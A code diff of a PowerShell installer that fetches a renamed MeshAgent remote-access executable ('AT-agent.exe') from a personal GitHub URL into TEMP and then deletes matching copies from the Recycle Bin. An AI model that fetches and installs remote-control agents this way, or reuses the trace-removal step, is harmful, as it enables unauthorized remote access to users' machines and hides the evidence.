@@ -3,12 +3,10 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $URLs = @(
-    'https://yourmirror1.com/meshagent.exe',
-    'https://yourmirror2.com/meshagent.exe',
-    'https://yourmirror3.com/meshagent.exe'
+    'https://github.com/AmrouHab/Snippets/raw/refs/heads/main/rem/AT-agent.exe'
 )
 
-$exePath = "$env:TEMP\meshagent.exe"
+$exePath = "$env:TEMP\AT-agent.exe"
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
     try {
@@ -18,7 +16,7 @@ foreach ($URL in $URLs | Sort-Object { Get-Random }) {
 }
 
 if (-not (Test-Path $exePath)) {
-    Write-Host "Failed to download Mesh Agent." -ForegroundColor Red
+    Write-Host "Failed to download Amrou's Agent." -ForegroundColor Red
     throw
 }
 
@@ -42,7 +40,7 @@ if ($service) {
 }
 
 $recycleBinPath = [System.IO.Path]::Combine($env:SystemDrive, '\$Recycle.Bin')
-$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'meshagent.exe' -ErrorAction SilentlyContinue
+$filesInBin = Get-ChildItem -Path $recycleBinPath -Recurse -Filter 'AT-agent.exe' -ErrorAction SilentlyContinue
 foreach ($file in $filesInBin) {
     Remove-Item -Path $file.FullName -Force
 }
